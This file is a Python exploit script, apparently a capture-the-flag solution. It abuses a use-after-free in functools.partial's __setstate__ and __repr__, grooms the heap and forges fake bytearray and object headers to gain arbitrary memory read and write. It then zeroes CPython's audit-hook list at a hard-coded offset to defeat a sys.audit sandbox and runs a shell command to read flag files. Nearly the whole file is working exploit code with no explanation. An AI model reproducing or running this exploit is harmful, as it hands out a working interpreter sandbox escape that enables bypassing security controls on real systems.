# based on chilaxans functools exp
from functools import partial
import sys

length = 119


def make_pair():
    # heap grooming
    # returns tuple, bytearray pair where array exists directly after end of tuple
    fill = bytes((length // 2) * tuple.__itemsize__)
    r = range((length // 2) - 5)  # do these now so that we need less allocs later
    old = []  # store failures to increase memory pressure
    t0 = tuple(r)
    b0 = bytearray(fill)
    t1 = tuple(r)
    b1 = bytearray(fill)
    t = tuple(r)
    b = bytearray(fill)
    return t, b


p = partial(id)

bytearray_mem = memoryview(bytearray(bytearray.__basicsize__)).cast("P")
bytearray_mem[0] = 1  # refcount
bytearray_mem[1] = int(f"{bytearray.__call__}".split("0x")[1][:-1], 16)  # ob_type
bytearray_mem[2] = (2 ** (tuple.__itemsize__ * 8) - 1) // 2  # ob_size
bytearray_mem = bytearray_mem.tobytes()


class Fake:
    __slots__ = ["value"]

    def __repr__(self):
        raise Exception(memoryview(self.value))


Fake_mem = memoryview(bytearray(Fake.__basicsize__)).cast("P")
Fake_mem[0] = 1  # refcount
Fake_mem[1] = int(f"{Fake.__call__}".split("0x")[1][:-1], 16)  # ob_type
Fake_mem[2] = (
    int(f"{bytearray_mem.__add__}".split("0x")[1][:-1], 16) + bytes.__basicsize__ - 1
)
Fake_mem = Fake_mem.tobytes()


class WeirdRepr:
    def __repr__(self):
        global b  # otherwise it is freed after function and that causes more problems
        t, b = make_pair()
        p.__setstate__((id, t, {}, {}))
        mem = memoryview(b).cast("P")
        for i in range(len(mem)):
            mem[i] = (
                int(f"{Fake_mem.__add__}".split("0x")[1][:-1], 16)
                + bytes.__basicsize__
                - 1
            )
        return "Wack"


p.__setstate__((id, (WeirdRepr(),) * length, {}, {}))
try:
    repr(p)
except Exception as e:
    mem = e.args[0]

import sys

au = sys.audit.__init__
au_addr = str(au).split("0x")[1].split(">")[0]
au_addr = int(au_addr, 16)
au_loc = au_addr + 24

audit_ptr = int.from_bytes(mem[au_loc : au_loc + 8], "little")
audit_ptr = int.from_bytes(mem[audit_ptr + 24 : audit_ptr + 24 + 8], "little")
audit_head = audit_ptr + 990456
mem[audit_head : audit_head + 8] = bytes([0] * 8)
import os

os.system("cat /flag*.txt")
# EOF